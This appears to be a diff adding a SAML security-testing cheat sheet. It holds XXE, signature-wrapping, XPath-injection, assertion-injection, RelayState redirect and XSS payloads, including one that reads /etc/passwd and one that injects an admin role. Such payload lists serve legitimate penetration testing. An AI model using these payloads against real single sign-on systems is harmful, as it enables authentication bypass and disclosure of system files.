@@ -1,0 +1,108 @@
+# SAML Security Testing Payloads
+
+## XML Signature Bypass
+
+### XXE in SAML Request
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    &xxe;
+  </saml:Issuer>
+</samlp:AuthnRequest>
+```
+
+### XML Signature Wrapping
+
+```xml
+<samlp:Response>
+  <ds:Signature>
+    <ds:SignedInfo>
+      <ds:Reference URI="#validAssertion">
+    </ds:SignedInfo>
+    <ds:SignatureValue>legit_signature</ds:SignatureValue>
+  </ds:Signature>
+  
+  <saml:Assertion ID="validAssertion">
+    <!-- Signed assertion -->
+  </saml:Assertion>
+  
+  <saml:Assertion ID="injectedAssertion">
+    <!-- Attacker-controlled assertion -->
+  </saml:Assertion>
+</samlp:Response>
+```
+
+## XPath Injection
+
+```xml
+<saml:Attribute Name="username">
+  <saml:AttributeValue>
+    admin' or '1'='1
+  </saml:AttributeValue>
+</saml:Attribute>
+```
+
+## Assertion Injection
+
+```xml
+<saml:Assertion>
+  <saml:AttributeStatement>
+    <saml:Attribute Name="role">
+      <saml:AttributeValue>user</saml:AttributeValue>
+    </saml:Attribute>
+  </saml:AttributeStatement>
+</saml:Assertion>
+
+<!-- Inject another assertion -->
+<saml:Assertion>
+  <saml:AttributeStatement>
+    <saml:Attribute Name="role">
+      <saml:AttributeValue>admin</saml:AttributeValue>
+    </saml:Attribute>
+  </saml:AttributeStatement>
+</saml:Assertion>
+```
+
+## Relay State Attacks
+
+```
+# Test for open redirect
+RelayState=https://evil.com
+
+# XSS in RelayState
+RelayState=javascript:alert(1)
+```
+
+## Assertion Consumer Service
+
+```python
+# Test for CSRF
+# Check if ACS endpoint validates properly
+# Test for SAML response replay
+```
+
+## Common Bypass Techniques
+
+| Technique | Payload |
+|-----------|---------|
+| Comment injection | `<!-- -->` |
+| XML injection | `<ds:Signature>` |
+| Encoding bypass | Base64, URL encode |
+| Namespace bypass | Different prefix |
+| Time-based | Future expiration |
+
+## Decoder Tools
+
+```python
+import base64
+
+# Decode SAML response
+saml_response = "PHNhbWxwOlJlc3BvbnNl..."
+decoded = base64.b64decode(saml_response)
+print(decoded)
+```
